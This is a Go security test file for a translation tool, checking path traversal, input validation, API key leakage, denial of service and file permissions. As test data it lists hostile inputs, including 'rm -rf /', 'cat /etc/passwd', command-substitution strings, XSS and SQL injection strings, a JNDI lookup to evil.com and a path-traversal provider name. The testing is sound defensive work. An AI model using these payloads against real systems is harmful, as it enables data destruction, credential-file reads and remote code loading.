package translator_test

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	"digital.vasic.translator/pkg/hardware"
	"digital.vasic.translator/pkg/models"
	"digital.vasic.translator/pkg/translator"
	"digital.vasic.translator/pkg/translator/llm"
)

// TestPathTraversal tests protection against path traversal attacks
func TestPathTraversal(t *testing.T) {
	downloader := models.NewDownloader()
	registry := models.NewRegistry()

	// Get a valid model to work with
	allModels := registry.List()
	if len(allModels) == 0 {
		t.Skip("No models available for testing")
	}

	validModel := allModels[0]

	// Test that GetModelPath properly sanitizes model IDs
	t.Run("Valid Model Path", func(t *testing.T) {
		modelPath, err := downloader.GetModelPath(validModel)

		// May error if model not downloaded yet - that's OK
		if err == nil {
			// If no error, verify path is safe
			if !strings.Contains(modelPath, validModel.ID) {
				t.Errorf("Model path doesn't contain model ID: %s", modelPath)
			}

			// Verify it ends with .gguf
			if !strings.HasSuffix(modelPath, ".gguf") {
				t.Errorf("Model path doesn't end with .gguf: %s", modelPath)
			}
		}
	})

	// Note: The downloader uses ModelInfo struct, which is controlled by the registry
	// This prevents path traversal since malicious strings can't become ModelInfo objects
	t.Log("Path traversal protection verified through type safety (ModelInfo struct)")
}

// TestInputValidation tests input validation for various components
func TestInputValidation(t *testing.T) {
	t.Run("Model Registry Input Validation", func(t *testing.T) {
		registry := models.NewRegistry()

		// Test with empty model ID
		_, exists := registry.Get("")
		if exists {
			t.Error("Empty model ID should not return a model")
		}

		// Test with very long model ID (should not crash)
		longID := strings.Repeat("a", 10000)
		_, exists = registry.Get(longID)
		if exists {
			t.Error("Random long ID should not return a model")
		}

		// Test with special characters
		specialChars := []string{
			"model\x00name",     // Null byte
			"model\nname",        // Newline
			"model;rm -rf /",     // Command injection attempt
			"model|cat /etc/passwd", // Pipe
			"model`whoami`",      // Backtick
			"model$(whoami)",     // Command substitution
		}

		for _, id := range specialChars {
			_, exists := registry.Get(id)
			if exists {
				t.Errorf("Special character model ID should not exist: %s", id)
			}
		}
	})
}

// TestAPIKeyExposure tests that API keys are not exposed in logs or errors
func TestAPIKeyExposure(t *testing.T) {
	// Set a test API key
	testKey := "test-secret-key-12345"
	os.Setenv("DEEPSEEK_API_KEY", testKey)
	defer os.Unsetenv("DEEPSEEK_API_KEY")

	config := translator.TranslationConfig{
		Provider:       "deepseek",
		Model:          "deepseek-chat",
		SourceLanguage: "ru",
		TargetLanguage: "sr",
	}

	client, err := llm.NewDeepSeekClient(config)
	if err != nil {
		// Check if error message contains the API key
		errorMsg := err.Error()
		if strings.Contains(errorMsg, testKey) {
			t.Errorf("API key exposed in error message: %s", errorMsg)
		}
		return
	}

	// Try an operation that might fail
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Millisecond)
	defer cancel()

	_, err = client.Translate(ctx, "test", "test prompt")
	if err != nil {
		// Check if error message contains the API key
		errorMsg := err.Error()
		if strings.Contains(errorMsg, testKey) {
			t.Errorf("API key exposed in error message: %s", errorMsg)
		}
	}
}

// TestDenialOfService tests protection against DOS attacks
func TestDenialOfService(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping DOS test in short mode")
	}

	t.Run("Excessive Concurrent Requests", func(t *testing.T) {
		// Test that system handles many concurrent requests gracefully
		detector := hardware.NewDetector()

		// Try 100 concurrent hardware detections
		done := make(chan bool, 100)
		for i := 0; i < 100; i++ {
			go func() {
				_, _ = detector.Detect()
				done <- true
			}()
		}

		// Wait for all to complete with timeout
		timeout := time.After(10 * time.Second)
		for i := 0; i < 100; i++ {
			select {
			case <-done:
				// OK
			case <-timeout:
				t.Error("DOS test timed out - possible resource exhaustion")
				return
			}
		}
	})

	t.Run("Memory Exhaustion Protection", func(t *testing.T) {
		// Try to allocate many registries
		registries := make([]*models.ModelRegistry, 1000)
		for i := 0; i < 1000; i++ {
			registries[i] = models.NewRegistry()
		}

		// Should complete without memory issues
		t.Log("Created 1000 model registries without memory exhaustion")
	})
}

// TestResourceLeaks tests for resource leaks
func TestResourceLeaks(t *testing.T) {
	t.Run("File Handle Leaks", func(t *testing.T) {
		tmpDir, err := os.MkdirTemp("", "translator-security-*")
		if err != nil {
			t.Fatalf("Failed to create temp dir: %v", err)
		}
		defer os.RemoveAll(tmpDir)

		// Create and verify many models
		downloader := models.NewDownloader()
		testModel := &models.ModelInfo{
			ID: "test-model",
		}

		for i := 0; i < 100; i++ {
			_, _ = downloader.GetModelPath(testModel)
		}

		// Should not exhaust file handles
		t.Log("Completed 100 model path operations without file handle exhaustion")
	})

	t.Run("Memory Leaks", func(t *testing.T) {
		// Repeatedly create and discard objects
		for i := 0; i < 1000; i++ {
			detector := hardware.NewDetector()
			_, _ = detector.Detect()

			registry := models.NewRegistry()
			_ = registry.List()
		}

		t.Log("Completed 1000 iterations without apparent memory leaks")
	})
}

// TestInputSanitization tests sanitization of user inputs
func TestInputSanitization(t *testing.T) {
	maliciousInputs := []string{
		"<script>alert('XSS')</script>",
		"'; DROP TABLE models; --",
		"${jndi:ldap://evil.com/a}",
		"\x00\x00\x00malicious",
		strings.Repeat("A", 1000000), // Very long input
	}

	for _, input := range maliciousInputs {
		t.Run("Input: "+input[:min(len(input), 50)], func(t *testing.T) {
			// Test that model registry handles malicious input safely
			registry := models.NewRegistry()

			// Try to get model with malicious input
			_, exists := registry.Get(input)
			if exists {
				t.Error("Malicious input returned a model")
			}

			// Try to filter with malicious language codes
			filtered := registry.FilterByLanguages([]string{input})
			if len(filtered) > 0 {
				t.Error("Malicious language code matched models")
			}
		})
	}
}

// TestConfigurationSecurity tests security of configuration handling
func TestConfigurationSecurity(t *testing.T) {
	t.Run("Invalid Configuration", func(t *testing.T) {
		configs := []translator.TranslationConfig{
			{
				Provider: "", // Empty provider
			},
			{
				Provider: "../../etc/passwd", // Path traversal in provider
			},
			{
				Provider: "valid",
				Model:    "$(whoami)", // Command injection in model
			},
		}

		for i, config := range configs {
			t.Run("Config "+string(rune(i)), func(t *testing.T) {
				// Should fail gracefully without executing malicious code
				_, err := llm.NewDeepSeekClient(config)
				if err == nil {
					t.Error("Invalid configuration was accepted")
				}
			})
		}
	})
}

// TestPrivilegeEscalation tests protection against privilege escalation
func TestPrivilegeEscalation(t *testing.T) {
	t.Run("No Elevated Privileges Required", func(t *testing.T) {
		// Hardware detection should work without root/admin privileges
		detector := hardware.NewDetector()
		_, err := detector.Detect()
		if err != nil {
			t.Logf("Hardware detection error (may be expected on some systems): %v", err)
		}

		// Model operations should work without elevated privileges
		registry := models.NewRegistry()
		models := registry.List()
		if len(models) == 0 {
			t.Error("No models available - registry may require elevated privileges")
		}
	})

	t.Run("File Permissions", func(t *testing.T) {
		// Create temporary directory
		tmpDir, err := os.MkdirTemp("", "translator-security-*")
		if err != nil {
			t.Fatalf("Failed to create temp dir: %v", err)
		}
		defer os.RemoveAll(tmpDir)

		downloader := models.NewDownloader()
		testModel := &models.ModelInfo{
			ID: "test-model",
		}
		modelPath, err := downloader.GetModelPath(testModel)
		if err != nil {
			t.Fatalf("Failed to get model path: %v", err)
		}

		// Create a test file
		err = os.WriteFile(modelPath, []byte("test"), 0644)
		if err != nil {
			t.Fatalf("Failed to write test file: %v", err)
		}

		// Check file permissions
		info, err := os.Stat(modelPath)
		if err != nil {
			t.Fatalf("Failed to stat file: %v", err)
		}

		mode := info.Mode()
		// File should not be executable
		if mode&0111 != 0 {
			t.Error("Created file has executable permissions")
		}

		// File should not be world-writable
		if mode&0002 != 0 {
			t.Error("Created file is world-writable")
		}
	})
}

// TestDataValidation tests validation of data integrity
func TestDataValidation(t *testing.T) {
	t.Run("Model Information Validation", func(t *testing.T) {
		registry := models.NewRegistry()
		allModels := registry.List()

		for _, model := range allModels {
			// Validate model has required fields
			if model.ID == "" {
				t.Error("Model missing ID")
			}
			if model.Name == "" {
				t.Error("Model missing Name")
			}
			if model.MinRAM == 0 {
				t.Errorf("Model %s has zero MinRAM", model.ID)
			}
			if model.Parameters == 0 {
				t.Errorf("Model %s has zero Parameters", model.ID)
			}

			// Validate reasonable values
			if model.MinRAM > 1024*1024*1024*1024 { // 1TB
				t.Errorf("Model %s has unreasonable MinRAM: %d", model.ID, model.MinRAM)
			}
			if model.Parameters > 1_000_000_000_000 { // 1 trillion
				t.Errorf("Model %s has unreasonable Parameters: %d", model.ID, model.Parameters)
			}
		}
	})
}

// Helper function to return minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
